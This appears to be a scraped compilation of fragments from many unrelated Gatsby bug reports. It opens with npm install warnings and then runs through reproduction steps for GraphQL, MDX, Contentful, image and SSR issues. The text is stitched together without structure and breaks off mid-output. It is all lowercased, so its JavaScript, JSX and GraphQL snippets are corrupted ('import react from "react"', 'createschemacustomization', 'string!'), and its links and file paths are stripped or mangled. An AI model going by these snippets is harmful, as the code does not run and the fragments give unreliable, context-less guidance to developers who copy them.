npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\console-control-strings' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.console-control-strings.delete'
npm warn optional skipping optional dependency: core-util-is@1.0.2 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\core-util-is):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\core-util-is' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.core-util-is.delete'
npm warn optional skipping optional dependency: deep-extend@0.6.0 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\deep-extend):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\deep-extend' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.deep-extend.delete'
npm warn optional skipping optional dependency: delegates@1.0.0 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\delegates):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\delegates' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.delegates.delete'
npm warn optional skipping optional dependency: detect-libc@1.0.3 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\detect-libc):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\detect-libc' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.detect-libc.delete'
npm warn optional skipping optional dependency: fs.realpath@1.0.0 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\fs.realpath):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\fs.realpath' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.fs.realpath.delete'
npm warn optional skipping optional dependency: has-unicode@2.0.1 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\has-unicode):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\has-unicode' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.has-unicode.delete'
npm warn optional skipping optional dependency: inherits@2.0.4 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\inherits):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\inherits' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.inherits.delete'
npm warn optional skipping optional dependency: ini@1.3.5 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\ini):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\ini' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.ini.delete'
npm warn optional skipping optional dependency: isarray@1.0.0 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\isarray):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\isarray' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.isarray.delete'
npm warn optional skipping optional dependency: minimist@1.2.5 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\minimist):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\minimist' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.minimist.delete'
npm warn optional skipping optional dependency: ms@2.1.2 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\ms):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\ms' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.ms.delete'
npm warn optional skipping optional dependency: npm-normalize-package-bin@1.0.1 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\ pm-normalize-package-bin):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\ pm-normalize-package-bin' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.npm-normalize-package-bin.delete'
npm warn optional skipping optional dependency: number-is-nan@1.0.1 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\ umber-is-nan):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\ umber-is-nan' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.number-is-nan.delete'
npm warn optional skipping optional dependency: object-assign@4.1.1 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\object-assign):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\object-assign' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.object-assign.delete'
npm warn optional skipping optional dependency: os-homedir@1.0.2 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\os-homedir):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\os-homedir' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.os-homedir.delete'
npm warn optional skipping optional dependency: os-tmpdir@1.0.2 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\os-tmpdir):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\os-tmpdir' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.os-tmpdir.delete'
npm warn optional skipping optional dependency: path-is-absolute@1.0.1 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\path-is-absolute):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\path-is-absolute' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.path-is-absolute.delete'
npm warn optional skipping optional dependency: process-nextick-args@2.0.1 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\process-nextick-args):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\process-nextick-args' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.process-nextick-args.delete'
npm warn optional skipping optional dependency: safe-buffer@5.1.2 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\safe-buffer):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\safe-buffer' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.safe-buffer.delete'
npm warn optional skipping optional dependency: safer-buffer@2.1.2 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\safer-buffer):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\safer-buffer' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.safer-buffer.delete'
npm warn optional skipping optional dependency: sax@1.2.4 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\sax):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\sax' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.sax.delete'
npm warn optional skipping optional dependency: semver@5.7.1 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\semver):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\semver' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.semver.delete'
npm warn optional skipping optional dependency: set-blocking@2.0.0 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\set-blocking):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\set-blocking' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.set-blocking.delete'
npm warn optional skipping optional dependency: signal-exit@3.0.2 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\signal-exit):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\signal-exit' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.signal-exit.delete'
npm warn optional skipping optional dependency: strip-json-comments@2.0.1 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\strip-json-comments):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\strip-json-comments' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.strip-json-comments.delete'
npm warn optional skipping optional dependency: util-deprecate@1.0.2 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\util-deprecate):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\util-deprecate' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.util-deprecate.delete'
npm warn optional skipping optional dependency: wrappy@1.0.2 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\wrappy):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\wrappy' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.wrappy.delete'
npm warn optional skipping optional dependency: yallist@3.1.1 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\yallist):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\yallist' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.yallist.delete' + gatsby-cli@2.11.12
added 17 packages from 12 contributors and updated 1 package in 24.269s
``` --- ran ```
acer@acer-supermars mingw64 ~
$ npm list -g --depth=0
c:\\users\\acer
+-- unmet dependency gatsby-cli@2.11.7
| +-- @babel/code-frame@7.8.3
| +-- @babel/runtime@7.9.2
| +-- @hapi/joi@15.1.1
| +-- better-opn@1.0.0
| +-- bluebird@3.7.2
| +-- chalk@2.4.2
| +-- clipboardy@2.3.0
| +-- common-tags@1.8.0
| +-- configstore@5.0.1
| +-- convert-hrtime@3.0.0
| +-- core-js@2.6.11
| +-- envinfo@7.5.0
| +-- execa@3.4.0
| +-- fs-exists-cached@1.0.0
| +-- fs-extra@8.1.0
| +-- gatsby-core-utils@1.1.1
| +-- gatsby-telemetry@1.2.3
| +-- hosted-git-info@3.0.4
| +-- ink@2.7.1
| +-- ink-spinner@3.0.1
| +-- is-valid-path@0.1.1
| +-- lodash@4.17.15
| +-- meant@1.0.1
| +-- node-fetch@2.6.0
| +-- object.entries@1.1.1
| +-- opentracing@0.14.4
| +-- pretty-error@2.1.1
| +-- progress@2.0.3
| +-- prompts@2.3.2
| +-- react@16.13.1
| +-- redux@4.0.5
| +-- resolve-cwd@2.0.0
| +-- semver@6.3.0
| +-- signal-exit@3.0.3
| +-- source-map@0.7.3
| +-- stack-trace@0.0.10
| +-- strip-ansi@5.2.0
| +-- update-notifier@3.0.1
| +-- uuid@3.4.0
| +-- yargs@12.0.5
| `-- yurnalist@1.1.2
`-- global@4.4.0 npm err! missing: gatsby-cli@2.11.7, required by acer
npm err! missing: gatsby-core-utils@1.1.1, required by gatsby-cli@2.11.7
npm err! missing: gatsby-telemetry@1.2.3, required by gatsby-cli@2.11.7
npm err! missing: gatsby-core-utils@1.1.1, required by gatsby-telemetry@1.2.3
``` --- ran ```
acer@acer-supermars mingw64 ~
$ gatsby develop
bash: gatsby: command not found
clone/download it then npm install
i have created a [reduced test case](
i created it with the following steps: 1
[create a new hello world template]( #create-a-gatsby-site)
[make these changes](
run `yarn install` and then `yarn gatsby develop`.
`mkdir somedir`
`npm install -g gatsby-cli@latest`
`cd somedir && npm install gatsby@latest`
`gatsby recipes`
unfortunately i'm not sure how to reproduce the problem myself
for some reason, only my old pages are affected
when creating new pages, they seem to work fine.
* `gatsby new gatsby-mdx-blog-starter-project git@github.com:danieltott/gatsby-mdx-blog-starter-project.git`
* `cd gatsby-mdx-blog-starter-project`
* `gatsby develop`
* visit for _no_ layout, visit for _yes_ layout.
install the gatsby starter.
install & configure both gatsby-transformer-csv & gatsby-transformer-json
add one .csv and one .json file under /src/data/csv/ and /src/data/json respectively
include at least 1 field with a 4-digit number in each file
// csv file
name,year,code
test1,2019,9999
test2,2017,1600
test3,2016,7654
// json file
[ { "name": "test1", "year": 2019, "code": 9999 }, { "name": "test2", "year": 2017, "code": 1600 }, { "name": "test3", "year": 2016, "code": 7654 }
npm run develop at this point there are issues with the 4-digit field in graphql being assigned different field types (see below) 5
in gatsby-node.js add a createschemacustomization definition to declare the csv & json types created to use type int! for the 4-digit number field
// gatsy-node.js
module.exports.createschemacustomization = ({ actions }) => { const { createtypes } = actions const typedefs = ` type csvtestcsv implements node @dontinfer { name: string! date: date! @dateformat code: int! } type jsontestjson implements node @dontinfer { name: string! date: date! @dateformat code: int! } ` createtypes(typedefs)
npm run develop again no change in results.
git checkout
npm i ./node_modules/.bin/gatsby develop or ./node_modules/.bin/gatsby build
`npm install -g gatsby-cli@latest`
`npm install gatsby@latest`
`gatsby new www `
`gatsby recipes`
i created [this mdx blog starter]( to reproduce
it is [deployed to netlify]( where you can see the error, or run it locally: ```
* `gatsby new gatsby-mdx-blog-starter-project git@github.com:danieltott/gatsby-mdx-blog-starter-project.git`
* `cd gatsby-mdx-blog-starter-project`
* `gatsby develop`
* in firefox, visit
``` at this point, if you go to ` `, you'll get an error in the console on firefox (and firefox developer edition) `unreachable code after return statement ` with a link [to the mdn docs](
clone repo:
npm install
click on an affiliate link in development mode and note the result in the console.
go to www.gps936.com
click an affiliate link
look in the console and note the different staticquery console.log result
create new gatsby site `gatsby new test-wpgraphql` and cd to that directory
run `gatsby develop` and confirm the site is built properly at
install wpgraphql (`npm install --save gatsby-source-graphql`)
update gatsby-config.json with the following:
` { resolve: 'gatsby-source-graphql', options: { typename: 'wpgraphql', fieldname: 'wpgraphql', url: ' //url: ' refetchinterval: 60 }, },
run `gatsby develop`
- -
_i'm having problems creating a test graphql node and getting it to show up/be queriable; if anyone can pass on a tutorial on how to setup a mock graphql node with hardcoded data then i'd be happy to set this up_ 1
have a graphql node that contains a date in the format `2020-04-12t00:00:00+01:00`
within a query, try to reformat to `dd mmm yyyy` like so: ```
export const query = graphql` { alldates{ nodes { date(formatstring: "dd mmm yyyy") } } }
output formatted date value to console
run `gatsby build` or `gatsby develop` command locally
or fork and check terminal tab.
attempt using `gatsby-source-contentful` with `downloadlocal` enabled
if `gatsby develop` takes > 30 seconds, `createremotefilenode` will silently timeout
build will complete, but most `localfile` fields in graphiql will be `null`.
in the contentful ui 1
create a content type with field that is a reference
here is an example we have:
![image]( 2
create 2 entries of the previous type and make that reference field point to each other
in our situation we wanted a field on "page" to be able to reference another "page" for seo canonical purposes so the url would automatically update on changes
this also occurred for us when other content types referenced a "page", not just a type referencing the same type
run gatsby build and you should get the error shown above.
i created a [repo]( that demonstrates the problem
to view it: - clone the repo, check out the `repro` branch
- build the site, `yarn build`
- visit in-browser
right-click and "view source"
- the source does _not_ include the [global styles]( #l6) i "fixed" this issue by essentially recreating the plugin\'s behaviour inside `gatsby-ssr`
you can view this fix in the master branch
screenshot of the source without the right styles (`repro` branch):
<img width="1510" alt="screen shot 2020-04-14 at 3 11 27 pm" src=" "> screenshot of the source with the right styles (`master` branch):
<img width="1518" alt="screen shot 2020-04-14 at 3 13 06 pm" src=" ">
create a new gatsby project with `gatsby new`
add components `pages/images.js`, with the following content: ```
import react from 'react'; import { graphql, usestaticquery } from 'gatsby'; export default () => { const data = graphql(` query { allfile { edges { node { name publicurl } } } } `) console.log('data', data); return ( <react.fragment> <h2>images</h2> {data.allfile.edges.map(edge => <div><img alt={edge.node.name} src={edge.node.publicurl} />{edge.node.name}</div>)} </react.fragment> )
} ``` see error output: ```
error: it appears like gatsby is misconfigured
gatsby related `graphql` calls are supposed to only be evaluated at compile-time, and then compiled away
unfortunately, something went wrong and the query was left in the compiled code
unless your site has a complex or custom babel/gatsby configuration this is likely a bug in gatsby.
go to the following link to test - 1
use the following query : { bills(first: 10, updatedsince: "2019-11-15" searchquery:"\\"paid family leave\\"") { edges { node { title } } }
perform that query in a gatsby project using usestaticquery graphql (gatsby-source-graphql)
git clone '
git checkout 0509604986a5efd812d0ca3e016300e6143577e2
npm install
npx gatsby develop
open the browser in the address where gatsby develop is serving and you will see the error:
referenceerror: _createsuper is not defined
./.cache/query-result-store.js/</staticquerystore<
it is not ease to reproduce this bug, i cloned gatsby repository and successfully execute example/using-gatsby-source-graphql
i can't create a minimal reproduction.
install gatsby default starter.
add the 'image,' 'sharp,' 'transformer,' and 'source drupal' plugins
add code to the 'gatsby-node' file to create pages from a drupal content type.
create a template to format those page.
attempt to add the image via html img tag works.
modify to use the gatsby image component and the 'develop' command fails.
on a contentful rich text field, embed a model on it that has a many-link entry
on that model, nest another embed
when pulling the rich text json you will find that the first entry is unlocalized but the second is not
if a new repo is needed to demonstrate this, i could do so, additionally i can share any necessary exports, or even share private repro access to someone who's working on this.
clone [my repo]( **change to development branch**, and `npm install` and `npm run dev`
- all markdown blog post files and images are in content/blogposts/2
- page template is src/templates/blogpost.js
install to your vscode
open any gatsby project file which has import from 'gatsby' and wait till vscode extension analyze dependency graph
clone this github repo: try and run "gatsby develop" and you should see error.
check-out `gatsby-starter-hello-world`, update gatsby to version `2.20.16` and run project: ```
$ npx gatsby new bug-repro
$ cd bug-repro
$ npm i gatsby@2.20.16
$ npm start
not sure if this is universal but: - take a working app using v2.20.14
- update gatsby to v2.20.15
- build and publish
- empty the cache for your app
- visit your app
using the starter with issue reproduction below, and run the build: ```
$ gatsby_experimental_page_build_on_data_changes=true npm run build -- --log-pages
run the build again a few times
gatsby starter with minimal reproduction:
my gatsby-node.js: `
const createpages = require("./create/createpages") exports.createpagesstatefully = async ({ graphql, actions, reporter }, options) => { await createpages({ actions, graphql, reporter }, options)
` and createpages:
const pagetemplate = require.resolve("../src/templates/page.js") const get_pages = ` query get_pages($first:int $after:string) { wpgraphql { pages( first: $first after: $after # this will make sure to only get the parent nodes and no children where: { parent: null } ) { pageinfo { hasnextpage endcursor } nodes { id title pageid uri isfrontpage } } } }
` const allpages = []
let pagenumber = 0
const itemsperpage = 10 /** * this is the export which gatbsy will use to process
* * @param { actions, graphql } * @returns {promise<void>} */
module.exports = async ({ actions, graphql, reporter }, options) => { /** * this is the method from gatsby that we're going * to use to create pages in our static site
*/ const { createpage } = actions /** * fetch pages method
this accepts variables to alter * the query
the variable `first` controls how many items to * request per fetch and the `after` controls where to start in * the dataset
* * @param variables * @returns {promise<*>} */ const fetchpages = async (variables) => /** * fetch pages using the get_pages query and the variables passed in
*/ await graphql(get_pages, variables).then(({ data }) => { /** * extract the data from the graphql query results */ const { wpgraphql: { pages: { nodes, pageinfo: { hasnextpage, endcursor }, }, }, } = data /** * map over the pages for later creation */ nodes && nodes.map((pages) => { allpages.push(pages) }) /** * if there's another page, fetch more * so we can have all the data we need
*/ if (hasnextpage) { pagenumber++ reporter.info(`fetch page ${pagenumber} of pages...`) return fetchpages({ first: itemsperpage, after: endcursor }) } /** * once we're done, return all the pages * so we can create the necessary pages with * all the data on hand
*/ return allpages }) /** * kick off our `fetchpages` method which will get us all * the pages we need to create individual pages
*/ await fetchpages({ first: itemsperpage, after: null }).then((wppages) => { wppages && wppages.map((page) => { let pagepath = `${page.uri}` /** * if the page is the front page, the page path should not be the uri, * but the root path '/'
*/ if(page.isfrontpage) { pagepath = '/' } createpage({ path: pagepath, component: pagetemplate, context: { id: string(page.pageid) }, }) reporter.info(`page created: ${pagepath}`) }) reporter.info(`# -----> pages total: ${wppages.length}`) })
` 2 hours ago everything worked properly, any idea what could have happend?
i've generated a minimised test case on [github]( this includes 3 test cases, each using different directives
one for highlighting, one for hiding and a final for a combination of multiple
**code sandbox** [online sandbox]( **run it locally** `git clone ` to a local folder
then run `gatsby develop` find the test cases at `localhost:8000`
this appears to only happen on chrome canary
i was able to confirm others were able to reproduce this and i can not reproduce this on chrome stable
* load up a page with a list of posts
* hard refresh the page (might take a few times)
run gatsby develop
link: steps with bug:
access
home page is broken steps without bug
access
then click the logo
at the top left
home page styles are loaded properly
include the above component on your pages' layout and try clicking a gatsby link to another page.
- checkout gatsby
- open #l38-l46
- add line into the catch blog: ```javascript
console.log(`"${hit.objectid}" - error "${err.message}" `);
- run `gatsby develop`
i am unable to make a minimal project as i don't know what is causing the issue
however, if you clone and on master run `npm install` and see how the pages load fine on their older versions on firefox, chrome and safari
then if you run `npm update`, then run `gatsby develop` or `gatsby build && gatsby serve` you will see that firefox stops working completely.
use html in the markdown file, and don't forget to prepare a image - 15857286868631.png ```html
<div> <img src="./15857286868631.png" /> <img src="./15857286868631.png" />
implementing .env vars as follows: .env.development api_rest_url= api_graphql_url= api_host= local_host= .env.production api_rest_url= api_graphql_url= api_host= local_host= gatsby-config.js { resolve: 'gatsby-source-graphql', options: { typename: 'myapi', fieldname: 'myapi', url: process.env.api_graphql_url, }, }, > run `gatsby clean` > run `gatsby develop` or `gatsby build` remarks: > it will work fine if i hard code the url on `gatsby-config.js` > the env vars also work fine on the client side code, for instance `const url = `${process.env.local_host}/icons/icon-48x48.png`;
described above
the default repository with the above code in "gatsby-browser.js" should result in this behavior
i ran into this bug when debugging an infinite looping issue in my application.
use the `gatsby-image/withiepolyfill` on an image and apply `objectfit="contain"` to it.
open it in ie 11 and pay attention to the misalignment between the traced svg and the actual image.
creating a scss variable and exporting it:
$website-theme-color: #ff0077;
:export { websitethemecolor: $website-theme-color;
importing it in any component for example, index.js and using it as-
import scssvariables from "../styles/sass/_variables.scss"
<div css={css` color: ${scssvariables.websitethemecolor}; background-color: #00000080; `}
``` on serving the project in gatsby build, everything is working properly, but when serving build version all the css styling done through scss variables are being invalid
**note:- ** i cross-checked by removing all the scss variables and then build the file, everything is working fine.
i have set up an example repo, do a build & serve and try to click on the hamburger menu on the homepage.
here are the various file `index.js` ```js
import react from "react"
import container from "react-bootstrap/container"
import row from "react-bootstrap/row"
import col from "react-bootstrap/col" export default () => ( <> {/* <header /> */} <container fluid> <row> <col><div>yes</div></col> </row> </container> </>
``` `gatsby-ssr.js` file:
const react = require("react")
const { head, header, footer } = require("./src/components/components") exports.onrenderbody = ( { setheadcomponents, sethtmlattributes, setbodyattributes, setprebodycomponents, setpostbodycomponents }, pluginoptions
) => { setheadcomponents([ <react.fragment key="sample-ssr"> <div>this is the head</div> </react.fragment>, ]) // setbodyattributes({ style: { height: \'100%\', overflow: \'auto\', margin: \'0\' } }) setprebodycomponents([<header />]) setpostbodycomponents([<footer />])
``` `header.js`
import react from "react" export function header(props) { return (<div id="header">header</div>);
``` `footer.js`
import react from "react" export function footer(props) { return ( <div id="footer">footer</div> )
i've enabled 'gatsby-plugin-offline' in the project
run gatsby build and the serve to test on local
the console should show the sw install and that offline is ready
went offline then navigated (or refreshed with an update on reload off) and nothing loads from the cache.
module.exports = { sitemetadata:{ title: 'fullstack bootcamp' }, plugins:[ 'gatsby-plugin-sass', ],
here's my repo: when i run `npm start` i get the following on my localhost: ![image](
this is my repository: i hope you can help me! thanks
install the latest version
try building the site
open
repo is here:
this is my app:
i know it's a foreign language for most of you but you can play with pages until 2 of them cause a crash.
these 2 urls are the problem:
they just give you a blank screen in production but in development, it returns me the error below.
the only change i made before noticing this issue is optimising most of the images on the app.
import some-script with import() method
import loadable from 'react-loadable' const mycomponent = loadable({ loader: () => import('./some-script'), loading: <div />,
after building, the above some-script is included in `commons` chunk instead of a separate chunk file.
try installing `gatsby` with `gatsby-plugin-sharp`
my package.json contains this: `"gatsby":"2.0.91","gatsby-plugin-sharp": "2.2.14"`
### expected result packages should install successfully.
open starter page
this markdown: ```markdown
**in this post:**
- [about the project](#about)
- [how it all began](#beginnings)
- [assembling a team](#team)
- [building a prototype](#prototype)
- [get involved](#help) ### about the project <a name="about"></a>
add the following code to runkit (you can use this link:
this generates the correct `rel`
var remark = require('remark')
var externallinks = require("remark-external-links")
var html = require('remark-html')
var input = '[remark](
remark().use(externallinks).use(html).processsync(input).tostring()
``` try out my `gatsby-plugin-mdx` sandbox at the link below
this generates an invalid `rel`: **`gatsby-plugin-mdx` sandbox:**
gatsby develop 2
view site 1
gatsby build
view site both commands execute successfully
- go to (i'm using brave)
- observe each and tents from above by syd sujuaan (via unsplash.com) image loading (first-row third image) - hover over the above image with your mouse
- open a browser window and visit the starters page
- randomly select a starter and open the starter's page
- sometimes you'll need to do a hard refresh to get it to load, but on some browsers that doesn't show the correct layout (like on brave).
- it does not appear to matter which starter you look at, but it does seem to be random
a few i've experienced this issue on are and i've observed this on chrome and brave (as well as in incognito/private for each) so far.
create a monorepo with yarn workspaces
install gatsby in one of the monorepo packages, and start it
i've made my repo public in order that you can access it and test the code: please use firefox to reproduce the problem, beacuse i've just realized that there is an unrelated display bug with the menu when using chrome :)
the css file in question is menu.module.css.
install a gatsby new bug-repro
create a blog.js file in pages
make it into a react component that renders 'blog' to the screen
test in browser to see if it loads if /blog/ is added to url
(should work at this point) 5
follow all steps in the above mentioned article by: - adding pathprefix: '/blog' or '/blog/' (tried both) to gatsby-config.js - gatsby build --prefix-paths - gatsby serve --prefix-paths
follow the gatsby tutorials on a new machine with a new gatsby setup 2
add a new page (ie src/pages/about.js) 3
check the develop browser window, and go to the new page all new pages use this initial structure: `import react from "react"
export default () => (` 4
we see a 404 page with "there\'s not a page yet at /test/" 5
stop, then restart the gatsby develop processs 6
now it works! (i have installed nvm, and tried toggling from latest node (13.12.0) back to lts node (12.16.1), no difference)
all i did was follow the tutorial here and ran this (but as root, not user) `npm install -g gatsby-cli`
list of installed dependencies, updated from hello-world starter:
@appbaseio/reactivesearch@3.7.1
@aws-amplify/api@2.2.0
@aws-amplify/auth@2.1.7
@aws-amplify/pubsub@1.3.3
@fortawesome/fontawesome-svg-core@1.2.28
@fortawesome/free-brands-svg-icons@5.13.0
@fortawesome/free-solid-svg-icons@5.13.0
@fortawesome/pro-regular-svg-icons@5.13.0
@fortawesome/react-fontawesome@0.1.9
@tailwindcss/custom-forms@0.2.1
gatsby@2.20.8
gatsby-image@2.3.1
gatsby-plugin-manifest@2.3.3
gatsby-plugin-offline@3.1.2
gatsby-plugin-postcss@2.2.1
gatsby-plugin-react-helmet@3.2.1
gatsby-plugin-sharp@2.5.3
gatsby-source-filesystem@2.2.2
gatsby-source-graphql@2.2.1
gatsby-transformer-sharp@2.4.3
prettier@2.0.2
prop-types@15.7.2
react@16.13.1
react-dom@16.13.1
react-headroom@3.0.0
react-helmet@5.2.1
tailwindcss@1.2.0
uuid@7.0.2
``` configuration of plugin in `gatsy-config.js`:
{ resolve: `gatsby-source-graphql`, options: { typename: 'book', fieldname: 'catalogue', url: ' headers: { 'x-api-key': 'xxxxxx' } } }
in this repo
switch `fit` parameter on `gatsby-config.js`
`contain`<=>`inside`
sample project (which is just a project initialized with `gatsby new`: first, run:
gatsby_experimental_page_build_on_data_changes=true yarn gatsby build --log-pages
``` which should output ```
info built pages:
updated page: /404/
updated page: /
